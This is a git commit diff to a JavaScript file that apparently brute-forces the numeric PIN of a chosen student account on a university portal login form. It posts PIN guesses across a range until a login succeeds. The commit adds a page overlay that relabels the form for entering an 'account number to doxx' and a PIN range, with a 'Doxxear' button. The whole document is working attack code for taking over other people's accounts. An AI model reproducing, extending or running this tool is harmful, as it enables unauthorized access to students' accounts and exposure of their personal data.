cd8d2ac0d1bafc91e60e8cb58f81343a8a5ba526
Santiago Vergara <santiagovrlr@gmail.com>
2026-09-10 11:33:31 -0600

    Añade UI

--- script_b.js
+++ script_b.js
@@ -9,31 +9,67 @@
         const numberOfZeroes = Math.trunc(Math.log(number) / log10);
         return `${trailingZeroes[numberOfZeroes]}${number}`;
     }
-    
-    const lowerBound = inicio;
-    const upperBound = final;
 
-    async function sendPost(nip) {
-        const datos = `txtNumCuenta=${numCuenta}&txtNIP=${nip}&txtModulo=Consulta+M%C3%B3vil&hdnIdPersona=&hdnNombreAlumno=`;
+    async function sendPost(accoutNumber, nip) {
+        const datos = `txtNumCuenta=${accoutNumber}&txtNIP=${nip}&txtModulo=Consulta+M%C3%B3vil&hdnIdPersona=&hdnNombreAlumno=`;
 
         console.log(nip);
 
         return await $.post(postUrl, datos);
     }
 
-    for (let i = lowerBound; i <= upperBound; i++) {        
-        const nip = addTrailingZeroes(i);
-        const respuesta = await sendPost(nip);
-
-        console.log(respuesta);
-
-        if (respuesta.noError <= 0) {
-            window.location.href = "vista/index.php";
-            break;
-        }
-        else if (respuesta.mensaje === 'No tiene permiso para accesar a este módulo') {
-            console.log(respuesta.mensaje);
-            break;
+    async function dox(accountNumber = numCuenta, lowerBound = inicio, upperBound = final) {
+        for (let i = lowerBound; i <= upperBound; i++) {        
+            const nip = addTrailingZeroes(i);
+            const respuesta = await sendPost(accountNumber, nip);
+    
+            console.log(respuesta);
+    
+            if (respuesta.noError <= 0) {
+                window.location.href = "vista/index.php";
+                break;
+            }
+            else if (respuesta.mensaje === 'No tiene permiso para accesar a este módulo') {
+                console.log(respuesta.mensaje);
+                break;
+            }
         }
     }
-})(300000);
+
+    // Setup UI
+    (() => {
+        const labels = document.querySelectorAll('label');
+
+        const numCuentaInput = document.getElementById('txtNumCuenta');
+        numCuentaInput.type = 'number';
+
+        const labelNumCuenta = labels[0]
+        labelNumCuenta.textContent = 'Número de cuenta a doxxear';
+
+        const nipLabel = labels[1];
+        nipLabel.textContent = 'Rango de NIPs';
+
+        const nipInput = document.getElementById('txtNIP');
+        nipInput.value = inicio;
+        nipInput.type = 'number';
+
+        const secondNipInput = nipInput.cloneNode();
+        secondNipInput.value = final;
+        secondNipInput.type = 'number';
+
+        nipInput.insertAdjacentElement('afterend', secondNipInput);
+
+        const botonSubmit = document.querySelector(".btn-lg");
+        botonSubmit.textContent = 'Doxxear';
+        botonSubmit.onclick = (event) => {
+            event.preventDefault();
+            const accountNum = numCuentaInput.value;
+            const lowerBound = nipInput.value;
+            const upperBound = secondNipInput.value;
+            botonSubmit.textContent = 'Doxxeando...';
+            botonSubmit.disabled = true;
+
+            dox(accountNum, lowerBound, upperBound);
+        }
+    })();
+})();
